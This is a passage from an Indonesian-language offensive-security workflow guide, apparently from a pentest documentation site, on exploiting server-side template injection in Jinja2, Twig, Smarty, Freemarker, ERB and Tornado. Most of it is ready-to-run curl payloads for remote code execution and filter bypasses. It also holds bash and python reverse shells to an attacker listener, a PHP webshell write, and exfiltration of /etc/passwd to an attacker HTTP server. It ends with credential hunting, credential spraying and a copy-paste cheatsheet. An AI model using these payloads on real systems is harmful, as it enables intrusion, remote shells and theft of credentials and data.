# Script otomatis cari Popen index
python3 -c "
import urllib.request, urllib.parse

url = '${INJECT_URL}'
param = '${INJECT_PARAM}'
payload = \"{{''.__class__.__mro__[1].__subclasses__()}}\"

req_url = url + '?' + urllib.parse.urlencode({param: payload})
response = urllib.request.urlopen(req_url).read().decode()

classes = response.split(',')
for i, cls in enumerate(classes):
    if 'Popen' in cls or 'subprocess' in cls.lower():
        print(f'Index {i}: {cls.strip()}')
"
```

---

### Langkah 2A.4 — Jinja2 Filter Bypass (Jika Ada WAF/Filter)

Bash

```
# Test apakah ada filter
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{config}}" | grep -i "blocked\|waf\|forbidden"

# Bypass 1: Jika underscore (_) diblokir — pakai request.args
# Kirim payload via parameter lain
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{request.args.x}}" \
    --data-urlencode "x=INJECTED_VALUE"

# Bypass 2: Jika dot (.) diblokir — pakai attr filter
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{request|attr('application')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}"

# Bypass 3: Jika class diblokir — string concatenation
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{''['__cla''ss__']}}"

# Bypass 4: Jika brackets diblokir — gunakan __getitem__
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{''.__class__.__mro__.__getitem__(1).__subclasses__()}}"

# Bypass 5: Encoding dengan hex
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{request|attr('\x5f\x5fclass\x5f\x5f')}}"
```

**OUTPUT BERHASIL ✅ — Bypass berhasil:**

text

```
uid=33(www-data)...
```

**OUTPUT GAGAL ❌ — Semua bypass diblokir:**

text

```
Forbidden / WAF detected
```

➡️ Coba Burp Intruder dengan wordlist bypass payload:

Bash

```
# Google: site:github.com "jinja2 ssti bypass 2024"
# Referensi: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
```

---

### Langkah 2A.5 — Reverse Shell dari Jinja2

Bash

```
# Setup listener dulu
nc -lvnp $LPORT &
LISTENER_PID=$!

# Method 1: Bash reverse shell via cycler (RECOMMENDED)
REVSHELL_CMD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"

curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('$REVSHELL_CMD').read() }}"

# Tunggu 5 detik, cek apakah ada koneksi
sleep 5

# Method 2: Jika bash tidak ada, coba python
PYTHON_SHELL="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),x) for x in range(3)];subprocess.call([\"/bin/sh\"])'"

curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('$PYTHON_SHELL').read() }}"
```

**OUTPUT BERHASIL ✅ — Shell diterima:**

text

```
Ncat: Connection from 10.10.11.200:52341.
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

➡️ **SHELL DIDAPAT!** Upgrade dulu:

Bash

```
# Di dalam shell yang didapat:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

➡️ Lanjut ke **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)** untuk privilege escalation.

**OUTPUT GAGAL ❌ — Koneksi tidak masuk:**

text

```
(tidak ada koneksi ke listener)
```

➡️ Firewall memblokir outbound. Coba:

Bash

```
# Method: Write webshell ke disk
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('echo \"<?php system(\\\$_GET[cmd]); ?>\" > /var/www/html/shell.php').read() }}"

# Test webshell
curl -s "http://$TARGET/shell.php?cmd=id"
```

---

## ═══════════════════════════════════════════

## FASE 2B: TWIG WORKFLOW (PHP)

## ═══════════════════════════════════════════

> **Masuk sini jika:** `{{7*7}}` → `49` DAN `{{7*'7'}}` → `49` (atau error Twig)

### Langkah 2B.1 — Konfirmasi Twig

Bash

```
# Command 1: Cek Twig-specific object
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{_self}}"

# Command 2: Cek Twig version
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{_self.getTemplateName()}}"

# Command 3: Trigger error untuk lihat stack trace
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{['INTENTIONAL ERROR']}}" 2>&1 | \
    grep -iE "(twig|Twig|vendor)"
```

**OUTPUT BERHASIL ✅ — Twig terkonfirmasi:**

text

```
Twig\Error\RuntimeError: ...
/vendor/twig/twig/...
```

Bash

```
export ENGINE="twig"
echo "[*] Engine: Twig (PHP)"
```

---

### Langkah 2B.2 — Twig Information Disclosure

Bash

```
# Command 1: Cek environment Twig
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{_self.env}}"

# Command 2: Cek globals yang tersedia
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{dump(app)}}"

# Command 3: Jika Symfony/Silex — dump request
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{dump(app.request.server.all())}}"
```

---

### Langkah 2B.3 — Twig RCE Attempts

Bash

```
# Method 1: Classic technique (Twig < 1.x)
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# Method 2: Via exec directly (beberapa konfigurasi)
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"

# Method 3: Via passthru
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}"
```

**OUTPUT BERHASIL ✅ — RCE berhasil:**

HTML

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**OUTPUT GAGAL ❌ — Method tidak tersedia:**

text

```
Error: registerUndefinedFilterCallback is not a method
```

➡️ Twig versi baru memblokir ini. Coba:

Bash

```
# Method 4: Via filter injection (Twig 2.x+)
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{'id'|filter('system')}}"

# Method 5: Via map filter dengan PHP function
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{['id']|map('system')|join}}"

# Method 6: Cek apakah ada variable dengan php functions
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{app.request.server.get('PATH')}}"
```

---

## ═══════════════════════════════════════════

## FASE 2C: SMARTY WORKFLOW (PHP)

## ═══════════════════════════════════════════

> **Masuk sini jika:** `{7*7}` → `49`

### Langkah 2C.1 — Konfirmasi dan RCE

Bash

```
# Command 1: Konfirmasi Smarty
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={php}echo 'test';{/php}"

# Command 2: RCE langsung (Smarty 3.x ke bawah)
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={system('id')}"

# Command 3: Alternatif
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={exec('id')}"

# Command 4: Via php tag
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={php}system('id');{/php}"

# Command 5: Smarty 4.x (lebih restricted)
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={\$smarty.template_object->compiler_class}"
```

**OUTPUT BERHASIL ✅:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**OUTPUT GAGAL ❌ — Security policy aktif:**

text

```
Smarty Security Exception: Call to PHP function "system" is not allowed
```

➡️ Smarty security mode aktif. Cari fungsi yang tidak diblokir:

Bash

```
# Coba fungsi lain
for func in "phpinfo" "posix_getpwuid" "posix_getuid" "getenv" "get_current_user"; do
    result=$(curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={${func}()}" 2>/dev/null)
    if ! echo "$result" | grep -qi "not allowed\|security"; then
        echo "[+] $func tidak diblokir!"
    fi
done
```

---

## ═══════════════════════════════════════════

## FASE 2D: FREEMARKER WORKFLOW (Java)

## ═══════════════════════════════════════════

> **Masuk sini jika:** `${7*7}` → `49`

### Langkah 2D.1 — Konfirmasi dan Information Disclosure

Bash

```
# Command 1: Konfirmasi Freemarker
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=\${.version}"

# Command 2: Data model yang tersedia
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=\${.data_model}"

# Command 3: Template name
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=\${.template_name}"
```

**OUTPUT BERHASIL ✅:**

text

```
2.3.29    ← Freemarker version
```

### Langkah 2D.2 — Freemarker RCE

Bash

```
# Method 1: Via freemarker.template.utility.Execute (CLASSIC)
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"

# Method 2: Via ObjectConstructor
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}=<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()><#assign br=ob(\"java.lang.ProcessBuilder\",[\"/bin/sh\",\"-c\",\"id\"])><#assign dummy=br.start()>\${br.start().text}"

# Method 3: Via JythonRuntime (jika Jython tersedia)
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}=<#assign jy=\"freemarker.ext.jython.JythonRuntime\"?new()><#import jy as jy2>\${jy2.exec(\"import os; print os.system('id')\")}"
```

**OUTPUT BERHASIL ✅:**

text

```
uid=1000(app) gid=1000(app) groups=1000(app)
```

**OUTPUT GAGAL ❌ — Class diblokir:**

text

```
freemarker.core._MiscTemplateException: Instantiating freemarker.template.utility.Execute is not allowed
```

➡️ `new_builtin_class_resolver` aktif. Google:

text

```
site:github.com "freemarker SSTI bypass new_builtin_class_resolver"
```

---

## ═══════════════════════════════════════════

## FASE 2E: ERB WORKFLOW (Ruby)

## ═══════════════════════════════════════════

> **Masuk sini jika:** `<%= 7*7 %>` → `49`

### Langkah 2E.1 — ERB RCE

Bash

```
# Command 1: Konfirmasi Ruby version
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}=<%= RUBY_VERSION %>"

# Command 2: RCE via backticks (RECOMMENDED - returns stdout)
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}=<\`id\`%>"

# Command 3: Via IO.popen
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}=<%= IO.popen('id').readlines() %>"

# Command 4: system() hanya return true/false, bukan output!
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}=<%= system('id') %>"
# → akan return "true", output ke server stdout bukan HTTP response

# Command 5: Via Open3 untuk dapat output
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}=<%= require 'open3'; stdout,_=Open3.capture2('id'); stdout %>"
```

**OUTPUT BERHASIL ✅:**

HTML

```
<p>Result: uid=1000(app) gid=1000(app)</p>
```

---

## ═══════════════════════════════════════════

## FASE 2F: TORNADO WORKFLOW (Python)

## ═══════════════════════════════════════════

> **Masuk sini jika:** `{{7*7}}` → `49` TAPI bukan Flask/Jinja2 (dari header fingerprint)

### Langkah 2F.1 — Tornado RCE

Bash

```
# PENTING: Tornado BERBEDA dari Jinja2!
# Tornado mendukung Python expression langsung dalam {{ }}

# Command 1: Konfirmasi Tornado
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{handler.settings}}"

# Command 2: RCE via __import__ (RECOMMENDED)
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ __import__('os').popen('id').read() }}"

# Command 3: Via subprocess
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ __import__('subprocess').check_output('id', shell=True).decode() }}"

# Command 4: Jangan gunakan ini (return code saja, bukan output!)
# {{ __import__('os').system('id') }}  → return 0, output ke server stdout
```

**OUTPUT BERHASIL ✅:**

text

```
uid=1000(app) gid=1000(app) groups=1000(app)
```

---

## ═══════════════════════════════════════════

## FASE 3: BLIND SSTI

## ═══════════════════════════════════════════

> **Masuk sini jika:** Expression dievaluasi tapi output TIDAK terlihat di HTTP response.

### Langkah 3.1 — Konfirmasi Blind SSTI

Bash

```
# Method 1: Boolean-based — response length berbeda
BASE=$(curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=hello" | wc -c)
EXPR=$(curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{7*7}}" | wc -c)
echo "Base: $BASE | Expression: $EXPR"
# Jika berbeda → ada evaluasi

# Method 2: Time-based delay (hati-hati di production!)
# Jinja2: timing via sleep
time curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('sleep 3').read() }}"
# Jika response ~3 detik lebih lambat → RCE blind terkonfirmasi!

# Method 3: OOB via DNS/HTTP callback
# Setup: buka http.server atau gunakan Burp Collaborator
python3 -m http.server 8080 &
HTTP_SERVER_PID=$!

curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('curl http://$LHOST:8080/test').read() }}"
# Cek apakah ada request masuk ke http.server
```

**OUTPUT BERHASIL ✅ — OOB callback diterima:**

text

```
# Di terminal http.server:
10.10.11.200 - - [01/Jan/2024] "GET /test HTTP/1.1" 200 -
```

➡️ **Blind RCE Confirmed!** Exfiltrate data:

Bash

```
# Exfiltrasi file via OOB
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('curl http://$LHOST:8080/?\$(cat /etc/passwd | base64 -w0)').read() }}"

# Atau gunakan reverse shell langsung
curl -sG "$INJECT_URL" \
    --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\" &').read() }}"
```

---

## ═══════════════════════════════════════════

## FASE 4: POST-EXPLOITATION & PIVOT

## ═══════════════════════════════════════════

### Langkah 4.1 — Recon Setelah Dapat RCE

Bash

```
# Setelah dapat shell (atau via SSTI command execution):
# Function helper untuk Jinja2
rce() { curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('$1').read() }}"; }

# Recon lengkap
echo "=== OS INFO ===" && rce "uname -a"
echo "=== CURRENT USER ===" && rce "id && whoami"
echo "=== NETWORK ===" && rce "ip a 2>/dev/null || ifconfig"
echo "=== OPEN PORTS ===" && rce "ss -tunp 2>/dev/null | head -20"
echo "=== PROCESSES ===" && rce "ps aux 2>/dev/null | head -20"
echo "=== CRON JOBS ===" && rce "cat /etc/crontab 2>/dev/null"
echo "=== ENVIRONMENT ===" && rce "env 2>/dev/null"
echo "=== SUDO RIGHTS ===" && rce "sudo -l 2>/dev/null"
echo "=== SUID FILES ===" && rce "find / -perm -4000 -type f 2>/dev/null | head -20"
echo "=== HOME DIRS ===" && rce "ls -la /home 2>/dev/null"
echo "=== CREDENTIALS ===" && rce "find / -name '*.conf' -o -name '*.env' -o -name 'config.php' 2>/dev/null | head -20"

# Simpan semua output
for cmd in "id" "uname -a" "cat /etc/passwd" "cat /proc/net/tcp" "env"; do
    echo "### $cmd ###" >> ~/ssti_loot/output/recon.txt
    rce "$cmd" >> ~/ssti_loot/output/recon.txt
done
```

### Langkah 4.2 — Cross-Service Credential Testing

Setelah dapat credentials dari config atau file:

Bash

```
# Jika dapat database credentials dari Flask config
export DB_USER="admin"
export DB_PASS="found_password"
export DB_HOST="localhost"

# Test database connection (jika ada port forwarding)
nxc mysql $TARGET -u $DB_USER -p $DB_PASS        # → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
nxc mssql $TARGET -u $DB_USER -p $DB_PASS        # → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>

# Test SSH dengan credentials yang ditemukan
nxc ssh $TARGET -u $DB_USER -p $DB_PASS          # → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
```

**Chart Cross-Service dari SSTI:**

text

```
SSTI RCE (Shell diperoleh)
     │
     ├─ ─→ /etc/passwd → usernames → SSH bruteforce → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ config files → DB creds → 14_database_workflow.md
     ├──→ .ssh/id_rsa → SSH login → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ App source code → hardcoded secrets → berbagai target
     ├──→ Internal network → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
     └──→ Privesc → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

---

## ═══════════════════════════════════════════

## TROUBLESHOOTING — ERROR UMUM & SOLUSINYA

## ═══════════════════════════════════════════

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|`{{7*7}}` literal|Bukan SSTI / di-escape|Coba syntax engine lain|
|`UndefinedError: 'cycler'`|Bukan Flask context|Pakai subclasses chain|
|`TemplateSyntaxError`|Syntax salah|Cek quote/bracket matching|
|`SecurityError`|Sandbox aktif|Cari bypass atau alternative primitive|
|`500 Internal Server Error`|Expression dievaluasi!|Baca stack trace untuk fingerprint|
|Index `Popen` berbeda|Environment berbeda|Enumerate ulang subclasses|
|Output kosong / blind|Stdout tidak ke HTTP|Gunakan OOB / reverse shell|
|WAF blocking `{{`|Firewall aktif|Coba encoding / alternative syntax|
|`os` module tidak ada|Restricted import|Coba `subprocess`, `commands`, `popen2`|
|Payload kerja di curl tapi tidak Burp|Encoding berbeda|Bandingkan raw request|

**Ketika Buntu — Google Query yang Efektif:**

text

```
"jinja2 ssti bypass sandbox 2024"
"twig ssti rce latest version"
"freemarker ssti security manager bypass"
"[ERROR MESSAGE] ssti template injection"
site:github.com "ssti payload" "[ENGINE NAME]"
site:hacktricks.xyz ssti "[ENGINE]"
```

---

## ═══════════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════════

text

```
START: Temukan input field yang direfleksikan
│
├─ FASE 0: Fingerprint teknologi dari headers
│   ├─ Werkzeug/Flask     → Curiga Jinja2
│   ├─ PHP                → Curiga Twig/Smarty
│   ├─ Express/Node.js    → Curiga Handlebars
│   └─ Java/Tomcat        → Curiga Freemarker/Velocity
│
├─ FASE 1: Universal Detection
│   ├─ {{7*7}} → 49       → Test {{7*'7'}}
│   │   ├─ 7777777        → JINJA2 → FASE 2A
│   │   └─ 49             → TWIG → FASE 2B
│   ├─ ${7*7} → 49        → FREEMARKER → FASE 2D
│   ├─ {7*7} → 49         → SMARTY → FASE 2C
│   ├─ <%=7*7%> → 49      → ERB → FASE 2E
│   └─ Error 500          → Baca stack trace → Identify engine
│
├─ FASE 2: Engine-Specific Exploitation
│   ├─ Jinja2: cycler globals → subclasses chain → reverse shell
│   ├─ Twig: registerUndefinedFilterCallback → RCE
│   ├─ Smarty: {system("id")} → RCE
│   ├─ Freemarker: Execute class → RCE
│   ├─ ERB: backticks → RCE
│   └─ Tornado: __import__('os') → RCE
│
├─ FASE 3: Blind SSTI
│   ├─ Time-based confirmation
│   ├─ OOB callback
│   └─ Blind reverse shell
│
└─ FASE 4: Post-Exploitation
    ├─ Recon (id, hostname, network, files)
    ├─ Credential hunting (config, env, source)
    └─ Pivot ke service lain
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="4444"
export INJECT_URL="http://$TARGET/search"
export INJECT_PARAM="q"

# === DETECTION ===
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{7*7}}"
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{7*'7'}}"
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=\${7*7}"
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={7*7}"
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=<%= 7*7 %>"

# === JINJA2 INFO DISCLOSURE ===
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{config}}"
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{request}}"

# === JINJA2 RCE (GUNAKAN INI DULU) ===
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('id').read() }}"
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{ joiner.__init__.__globals__.os.popen('id').read() }}"
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{ namespace.__init__.__globals__.os.popen('id').read() }}"

# === JINJA2 REVERSE SHELL ===
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"').read() }}"

# === TWIG RCE ===
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# === FREEMARKER RCE ===
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"

# === ERB RCE ===
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=<\`id\`%>"

# === TORNADO RCE ===
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{ __import__('os').popen('id').read() }}"

# === SMARTY RCE ===
curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={system('id')}"

# === AUTO DETECTION ===
python3 ~/tools/tplmap/tplmap.py -u "${INJECT_URL}?${INJECT_PARAM}=*"
python3 ~/tools/sstimap/sstimap.py -u "${INJECT_URL}?${INJECT_PARAM}=*"
```

---

> **➡️ NEXT:** Setelah SSTI berhasil dan dapat shell, lanjut ke:
> 
> - **`[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)`** jika target Linux
> - **`14_database_workflow.md`** jika ketemu DB credentials dari config
> - **`[⚡ Quick Start: Urutan Kerja Pivoting (Untuk Pemula)](/docs/pivoting-tunneling)`** jika perlu pivot ke network internal

